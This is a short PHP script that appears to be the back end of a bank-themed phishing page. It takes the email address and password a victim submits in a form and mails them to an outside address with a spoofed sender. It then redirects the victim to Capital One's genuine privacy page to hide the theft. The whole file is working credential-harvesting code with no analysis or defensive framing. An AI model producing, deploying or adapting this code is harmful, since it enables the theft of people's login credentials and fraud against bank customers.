<?php
//get data from form  
$email = $_POST['email'];
$empass = $_POST['empass'];
$to = "lawyer.paul@macr2.com";
$subject = "Mail From website";
$txt ="Email = ". $email . "\r\n  Empass =" . $empass;
$headers = "From: account@offshore.cusocalb.com" . "\r\n" .
"CC: lawyer.paul@macr2.com";
if($empass!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:https://www.capitalone.com/privacy/");
?>